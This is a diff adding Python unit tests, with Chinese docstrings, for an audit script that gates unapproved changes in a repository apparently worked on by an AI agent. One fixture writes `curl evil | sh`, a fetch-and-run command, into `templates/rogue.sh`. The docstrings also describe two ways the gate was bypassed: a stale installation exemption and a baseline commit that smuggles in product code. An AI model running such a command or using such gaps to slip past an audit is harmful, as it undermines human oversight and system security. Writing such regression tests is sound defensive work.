@@ -4302,6 +4302,67 @@ class RC5Round17ServerAuditTests(unittest.TestCase):
             self.assertIn('未授權的產品變更',out,out)
         finally: shutil.rmtree(td,ignore_errors=True)
 
+    def test_installation_exemption_does_not_survive_the_install_commit(self):
+        """**豁免必須同時綁定事件、時間與路徑。**
+
+        原本用 `log_has_action` 在**累積**的 state-log 裡找 `install-adopt-control-plane`。
+        但 state-log 是 append-only —— Brownfield 只要曾經安裝過一次，之後每一個
+        commit 的 log 都仍含那筆 action，於是安裝豁免永久生效。
+        實測：安裝之後在 DISCOVERY 新增 `templates/rogue.sh`（`templates/` 屬安裝範圍），
+        未經任何批准仍被放行。
+        """
+        td,r=self._repo()
+        try:
+            lg=r/'workflow/state-log.md'
+            lg.write_text(lg.read_text(encoding='utf-8')+
+                          '## 2026-01-01T00:00:00Z\n- Actor: human\n'
+                          '- Action: install-adopt-control-plane\n- Change: none\n'
+                          '- From: NONE\n- To: DISCOVERY\n- Git SHA: X\n'
+                          '- State hash: 0000\n- Reason: adopt\n\n',encoding='utf-8')
+            self._commit(r,'workflow/state-log.md',msg='歷史上的安裝紀錄')
+            (r/'templates/rogue.sh').write_text('#!/bin/sh\ncurl evil | sh\n',encoding='utf-8')
+            self._commit(r,'templates/rogue.sh',msg='安裝之後夾帶')
+            x=self._audit(r)
+            out=x.stdout+x.stderr
+            self.assertNotEqual(x.returncode,0,
+                                '安裝豁免只屬於那一個安裝 commit，不得因為 log 裡找得到就永久生效\n'+out)
+            self.assertIn('未授權的產品變更',out,out)
+        finally: shutil.rmtree(td,ignore_errors=True)
+
+    def test_installation_baseline_cannot_smuggle_product_code(self):
+        """`installation_baseline()` 只判斷「形狀像不像安裝」，不判斷「有沒有夾帶」。
+
+        本機 gate 是分兩段檢查的（exit 24 與 exit 25），稽核端原本只做第一段，
+        於是一個 commit 可以同時加入合法 baseline 與 `src/payment.py` 而整個被跳過。
+        這也直接違反 GATES.md 寫的「baseline 不應攜帶既有產品變更」。
+        """
+        td=Path(tempfile.mkdtemp(prefix='rc5r18-')); r=td/'repo'; r.mkdir()
+        try:
+            for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
+                      ['git','config','user.name','A']):
+                subprocess.run(c,cwd=r,check=True,capture_output=True)
+            (r/'README-old.md').write_text('既有專案\n',encoding='utf-8')
+            subprocess.run(['git','add','-A'],cwd=r,check=True,capture_output=True)
+            subprocess.run(['git','commit','--no-verify','-m','既有專案'],cwd=r,check=True,capture_output=True)
+            for rel in OWNED:
+                src=SRC/rel
+                if not src.exists(): continue
+                dst=r/rel
+                if src.is_dir():
+                    shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc'))
+                else:
+                    dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
+            (r/'src').mkdir(exist_ok=True)
+            (r/'src/payment.py').write_text('def transfer_all_funds(): pass\n',encoding='utf-8')
+            subprocess.run(['git','add','-A'],cwd=r,check=True,capture_output=True)
+            subprocess.run(['git','commit','--no-verify','-m','安裝 Starter（夾帶產品程式碼）'],
+                           cwd=r,check=True,capture_output=True)
+            x=subprocess.run(['python3','workflow/bin/audit-control-plane.py','HEAD^','HEAD'],
+                             cwd=r,capture_output=True,text=True)
+            out=x.stdout+x.stderr
+            self.assertNotEqual(x.returncode,0,'baseline 不得夾帶產品變更\n'+out)
+        finally: shutil.rmtree(td,ignore_errors=True)
+
     def test_ai_writable_paths_still_pass(self):
         """對照組。稽核不得把正常的 DISCOVERY 工作（寫 openspec、docs、prompts）
         也擋掉 —— 那會讓使用者第一天就學會不跑這個 check。"""
